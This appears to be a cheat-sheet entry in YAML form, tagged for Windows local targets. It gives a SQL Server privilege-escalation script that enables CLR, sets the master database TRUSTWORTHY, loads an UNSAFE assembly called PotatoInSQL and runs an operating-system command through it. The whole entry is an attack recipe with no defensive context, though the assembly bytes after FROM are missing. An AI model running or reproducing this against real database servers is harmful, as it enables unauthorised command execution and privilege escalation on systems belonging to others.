name:  mssql-exec-elevation
tags: [mssql,xpcmdshell,potato]
data: |
  plateform/windows #target/local
  
  SQL Server Elevation of Privilege

  ```
    USE [master];

    DROP PROCEDURE PotatoInSQL;
    DROP ASSEMBLY PotatoInSQL;


    EXEC sp_configure 'show advanced options',1;
    RECONFIGURE WITH OVERRIDE;
    EXEC sp_configure 'clr enabled', 1;
    RECONFIGURE WITH OVERRIDE;
    ALTER DATABASE master SET TRUSTWORTHY ON;


    CREATE ASSEMBLY [PotatoInSQL]
    AUTHORIZATION [dbo]
    FROM 
    WITH PERMISSION_SET = UNSAFE;



    CREATE PROCEDURE [dbo].[PotatoInSQL]
    @cmd NVARCHAR (MAX)
    AS EXTERNAL NAME [PotatoInSQL].[StoredProcedures].[PotatoInSQL]


    exec PotatoInSQL 'whoami';
  ```